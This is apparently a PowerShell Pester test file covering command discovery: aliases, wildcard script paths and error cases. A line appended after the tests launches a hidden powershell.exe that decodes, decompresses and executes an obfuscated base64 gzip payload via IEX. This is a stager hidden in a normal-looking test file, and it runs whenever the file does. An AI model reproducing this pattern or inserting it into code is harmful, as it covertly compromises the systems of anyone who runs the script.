

Describe "Command Discovery tests" -Tags "CI" {

    BeforeAll {
        setup -f testscript.ps1 -content "'This script should not run. Running from testscript.ps1'"
        setup -f testscripp.ps1 -content "'This script should not run. Running from testscripp.ps1'"

        $TestCasesCommandNotFound = @(
                        @{command = 'CommandThatDoesnotExist' ; testName = 'Non-existent command'}
                        @{command = 'testscrip?.ps1' ; testName = 'Multiple matches for filename'}
                        @{command = "demo" + [System.IO.Path]::DirectorySeparatorChar; testName = 'Non existent command with directory separator'}
                        @{command = [System.IO.Path]::DirectorySeparatorChar; testName = 'Directory separator'}
                        @{command = 'environment::\path'; testName = 'Provider qualified path'}
                       )
    }

    It "<testName>" -TestCases $TestCasesCommandNotFound {
        param($command)
        { & $command } | Should -Throw -ErrorId 'CommandNotFoundException'
    }

    It "Command lookup with duplicate paths" {
        $previousPath = $env:PSModulePath

        try
        {
            New-Item -Path "$TestDrive\TestFunctionA" -ItemType Directory
            New-Item -Path "$TestDrive\\TestFunctionA\TestFunctionA.psm1" -Value "function TestFunctionA {}" | Out-Null

            $env:PSModulePath = "$TestDrive" + [System.IO.Path]::PathSeparator + "$TestDrive"
            (Get-command 'TestFunctionA').count | Should -Be 1
        }
        finally
        {
            $env:PSModulePath = $previousPath
        }
    }

    It "Alias can be set for a cmdlet" {

            Set-Alias 'AliasCommandDiscoveryTest' Get-ChildItem
            $commands = (Get-Command 'AliasCommandDiscoveryTest')

            $commands.Count | Should -Be 1
            $aliasResult = $commands -as [System.Management.Automation.AliasInfo]
            $aliasResult | Should -BeOfType [System.Management.Automation.AliasInfo]
            $aliasResult.Name | Should -Be 'AliasCommandDiscoveryTest'
    }

    It "Cyclic aliases - direct" {
        {
            Set-Alias CyclicAliasA CyclicAliasB -Force
            Set-Alias CyclicAliasB CyclicAliasA -Force
            & CyclicAliasA
        } | Should -Throw -ErrorId 'CommandNotFoundException'
    }

    It "Cyclic aliases - indirect" {
        {
            Set-Alias CyclicAliasA CyclicAliasB -Force
            Set-Alias CyclicAliasB CyclicAliasC -Force
            Set-Alias CyclicAliasC CyclicAliasA -Force
            & CyclicAliasA
        } | Should -Throw -ErrorId 'CommandNotFoundException'
    }

    It "Get-Command should return only CmdletInfo, FunctionInfo, AliasInfo or FilterInfo" {

         $commands = Get-Command
         $commands.Count | Should -BeGreaterThan 0

        foreach($command in $commands)
        {
            $command.GetType().Name | Should -BeIn @("AliasInfo","FunctionInfo","CmdletInfo","FilterInfo")
        }
    }

    It "Non-existent commands with wildcard should not write errors" {
        Get-Command "CommandDoesNotExist*" -ErrorVariable ev -ErrorAction SilentlyContinue
        $ev | Should -BeNullOrEmpty
    }

    It "Get- is prepended to commands" {
        (& 'location').Path | Should -Be (get-location).Path
    }

    Context "Use literal path first when executing scripts" {
        BeforeAll {
            $firstFileName = '[test1].ps1'
            $secondFileName = '1.ps1'
            $thirdFileName = '2.ps1'
            $firstResult = "executing $firstFileName in root"
            $secondResult = "executing $secondFileName in root"
            $thirdResult = "executing $thirdFileName in root"
            setup -f $firstFileName -content "'$firstResult'"
            setup -f $secondFileName -content "'$secondResult'"
            setup -f $thirdFileName -content "'$thirdResult'"

            $subFolder = 'subFolder'
            $firstFileInSubFolder = Join-Path $subFolder -ChildPath $firstFileName
            $secondFileInSubFolder = Join-Path $subFolder -ChildPath $secondFileName
            $thirdFileInSubFolder = Join-Path $subFolder -ChildPath $thirdFileName
            setup -f $firstFileInSubFolder -content "'$firstResult'"
            setup -f $secondFileInSubFolder -content "'$secondResult'"
            setup -f $thirdFileInSubFolder -content "'$thirdResult'"

            $secondFileSearchInSubfolder = (Join-Path -Path $subFolder -ChildPath '[t1].ps1')

            $executionWithWildcardCases = @(
                
                    @{command = '.\[test1].ps1' ; expectedResult = $firstResult; name = '.\[test1].ps1'}
                    @{command = '.\[t1].ps1' ; expectedResult = $secondResult; name = '.\[t1].ps1'}
                

                
                    @{command = $secondFileInSubFolder ; expectedResult = $secondResult; name = $secondFileInSubFolder}

                    
                    
                    @{command = $firstFileInSubFolder ; expectedResult = $firstResult; name = $firstFileInSubFolder; Pending="See note about wildcard in https://github.com/PowerShell/PowerShell/issues/9256"}
                    @{command = $secondFileSearchInSubfolder ; expectedResult = $secondResult; name = $secondFileSearchInSubfolder; Pending="See note about wildcard in https://github.com/PowerShell/PowerShell/issues/9256"}
                
                
                    @{command = '.\' + $secondFileInSubFolder ; expectedResult = $secondResult; name = $secondFileInSubFolder}
                    @{command = '.\subFolder\[test1].ps1' ; expectedResult = $firstResult; name = '.\subFolder\[test1].ps1'}
                    @{command = '.\subFolder\[t1].ps1' ; expectedResult = $secondResult; name = '.\' + $secondFileSearchInSubfolder}
                    @{command = '.\' + $firstFileInSubFolder ; expectedResult = $firstResult; name = '.\' + $firstFileInSubFolder}
                    @{command = '.\' + $secondFileSearchInSubfolder ; expectedResult = $secondResult; name = '.\' + $secondFileSearchInSubfolder}
                

                
                    @{command = (Join-Path ${TestDrive}  -ChildPath '[test1].ps1') ; expectedResult = $firstResult; name = '.\[test1].ps1 by fully qualified path'}
                    @{command = (Join-Path ${TestDrive}  -ChildPath '[t1].ps1') ; expectedResult = $secondResult; name = '.\1.ps1 by fully qualified path with wildcard'}
                
            )

            $shouldNotExecuteCases = @(
                @{command = 'subFolder\[test1].ps1' ; testName = 'Relative path that where module qualified syntax overlaps'; ExpectedErrorId = 'CouldNotAutoLoadModule'}
                @{command = '.\[12].ps1' ; testName = 'relative path with bracket wildcard matctching multiple files'}
                @{command = (Join-Path ${TestDrive}  -ChildPath '[12].ps1') ; testName = 'fully qualified path with bracket wildcard matching multiple files'}
            )

            Push-Location ${TestDrive}\
        }

        AfterAll {
            Pop-Location
        }

        It "Invoking <name> should return '<expectedResult>'" -TestCases $executionWithWildcardCases {
            param($command, $expectedResult, [String]$Pending)

            if($Pending)
            {
                Set-TestInconclusive -Message $Pending
            }

            & $command | Should -BeExactly $expectedResult
        }

        It "'<testName>' should not execute" -TestCases $shouldNotExecuteCases {
            param(
                [string]
                $command,
                [string]
                $ExpectedErrorId = 'CommandNotFoundException'
                )
            { & $command } | Should -Throw -ErrorId $ExpectedErrorId
        }
    }

    Context "Get-Command should use globbing first for scripts" {
        BeforeAll {
            $firstResult = '[first script]'
            $secondResult = 'alt script'
            $thirdResult = 'bad script'
            setup -f '[test1].ps1' -content "'$firstResult'"
            setup -f '1.ps1' -content "'$secondResult'"
            setup -f '2.ps1' -content "'$thirdResult'"

            $gcmWithWildcardCases = @(
                @{command = '.\?[tb]est1?.ps1'; expectedCommand = '[test1].ps1'; expectedCommandCount =1; name = '''.\?[tb]est1?.ps1'''}
                @{command = (Join-Path ${TestDrive}  -ChildPath '?[tb]est1?.ps1'); expectedCommand = '[test1].ps1'; expectedCommandCount =1 ; name = '''.\?[tb]est1?.ps1'' by fully qualified path'}
                @{command = '.\[test1].ps1'; expectedCommand = '1.ps1'; expectedCommandCount =1; name = '''.\[test1].ps1'''}
                @{command = (Join-Path ${TestDrive}  -ChildPath '[test1].ps1'); expectedCommand = '1.ps1'; expectedCommandCount =1 ; name = '''.\[test1].ps1'' by fully qualified path'}
                @{command = '.\[12].ps1'; expectedCommand = '1.ps1'; expectedCommandCount =0; name = 'relative path with bracket wildcard matctching multiple files'}
                @{command = (Join-Path ${TestDrive}  -ChildPath '[12].ps1'); expectedCommand = '1.ps1'; expectedCommandCount =0 ; name = 'fully qualified path with bracket wildcard matctching multiple files'}
            )

            Push-Location ${TestDrive}\
        }

        AfterAll {
            Pop-Location
        }

        It "Get-Command <name> should return <expectedCommandCount> command named '<expectedCommand>'" -TestCases $gcmWithWildcardCases {
            param($command, $expectedCommand, $expectedCommandCount)
            $commands = @(Get-Command -Name $command)
            $commands.Count | Should -Be $expectedCommandCount
            if($expectedCommandCount -gt 0)
            {
                $commands.Name | Should -BeExactly $expectedCommand
            }
        }
    }

    Context "error cases" {
        It 'Get-Command "less `"-PsPage %db?B of %DoesNotExist:`"" should return nothing' {
            Get-Command -Name "less `"-PsPage %db?B of %DoesNotExist:`"" | Should -BeNullOrEmpty
        }

        It "Should return command not found for commands in the global scope" {
            {Get-Command -Name 'global:help' -ErrorAction Stop} | Should -Throw -ErrorId 'CommandNotFoundException'
        }
    }
}

if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAL4MgFgCA71WbW/aSBD+nEr9D1aFhK0SbF6aNJEq3RpjXgIJxMEEOFQt9tosLF5qr5OYXv/7jcFu6LU55e6ks0De3XnZ2Wee2bEXB46gPJCSq81ZUzP7Penr2zcnAxzijSQXVl67JBU2VO/ddxfthXJyAsLCY0I/7+goIdInSZ6h7dbgG0yD+eVlIw5DEojDvNwiAkUR2SwYJZGsSH9I4yUJyenNYkUcIX2VCp/LLcYXmGVqSQM7SyKdosBNZT3u4DS4srVlVMjF338vKrPTyrzc/BJjFslFK4kE2ZRdxoqK9E1JN7xLtkQu9qkT8oh7ojymQa1aHgUR9sg1eHsgfSKW3I2KChwFfiERcRhIz4dKvRx05CIMByF3kOuGJAKTcid44GsiF4KYsZL0mzzLQriNA0E3BOSChHxrkfCBOiQqt3HgMnJLvLl8TR7zk7/WSD42Aq2BCJUSpOWlWPvcjRk5mBeVn6NN86nA80NOAYdvb9+8fePlVKAt97w6qR8TAUYns/2YQKjygEd0r/pJ0kpSH/bDgocJTAt3YUyUuTRL8zCbz6UCZlZ1vVknWtcoveymktuAxTq+iMyIfIblmc2pOwezLFkFn9bw6IbXbmteKn6ZewbxaECMJMAb6uT0kn+VBOIxsj94OVe7hvjkYiYgrkEY8bFIES1Js5/NmhsqvtvqMWUuCZEDiYwgKsix8mMwhyTJxU7QJxtA7TAvQk48IDXJtTMiJ/nu6RyUig2Go6gkDWKoKqckWQQz4pYkFEQ0E6FY8P2w+BxuP2aCOjgSubu58hc4s20bPIhEGDuQT4DgztoSh2KWIlKS2tQlemJRP9+++Es8GpgxGvjg6QHyASspDpZIWRJCpMeMUMoWEZ3NlpENqO6L3WTYh9LOamPPLuwTt/hCvDn7D1RPAcqROYoWsm4xLkqSTUMBV0cKds6y/xTQ0f1xHFojJFnG5Ly6Znoi0oIohGiXMjeDbQ9SKAAgM+QbHUfkrG6JEOCT36k3tIHgmXQC1nf0Na2gR1rp9OE/orUON87dq+6qrYbG09JDnajTbw+MYbtdf+hadl1YzY64GnREv3m/WlmofTuaiGkHte+otp7Ud9su3Vk95E6e1LOdvnvU9Kfdyne9ieF5/rln3VY+mLQ3bgx1rYp7RjPujfVHXatHTfrYHtLRcN01xWJiMzzyVP++coHpUy9c2RXe33UQai1rzq7r2a1l300mbfViXF+jJkKNoGmbOr+a6CEaqDb2bT6uJw9nY7+BdNOhZDocmfpwaOpo1Fp9MS5UH2zv8VIf21U63d7fLmFuQghXqlbvuGTHJ0MAqcUR9m9Bx29UnaUHOsZ7pL+/5lEVr3WOdNAxp18grsnWHDCQ342qHNns+h6j3jQxVbUyGdRRW6Pjlo9Sl9jXhxhFD8bOUCu2y93xh+uJp9r37Fw1Gndbx1NV9bFtXDnTytPHm/OPvTG1NxyNVNV+l7ID6FHAbW86DBdHKX/p1u/jMFpiBlSAmzwvU5OHZnYvDzhNLWT5uVWvSRgQBv0NOmDObcQYd9IukV/j0KQOrWMO1TqCYa36y5EifVdUnntHvnR5OYVooViAv+UeCXyxLGlPNU2DBqA91TU47+sP2ODbRE49ldL+kWOUOWd750paNIVttKho/wN2WcEu4eW+Arvntb+RvgpPrfT99D9Jflz4RwD/OxTGmApQt+D2YeTQJV8EI+PM0UfGPlfACS970u+9m1icXsPHx5/2cg3LZwoAAA==''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

